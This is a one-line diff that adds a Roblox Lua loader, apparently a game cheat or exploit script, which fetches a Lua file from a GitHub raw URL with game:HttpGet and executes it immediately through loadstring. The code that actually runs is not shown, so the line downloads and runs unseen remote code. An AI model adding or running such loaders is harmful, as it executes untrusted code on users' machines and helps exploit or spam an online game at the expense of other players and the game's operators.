@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/partsoapmakerremain/loaders/main/loaders/the-hollow-clean-crew-spam3-cwuefngqocwko4.lua"))()
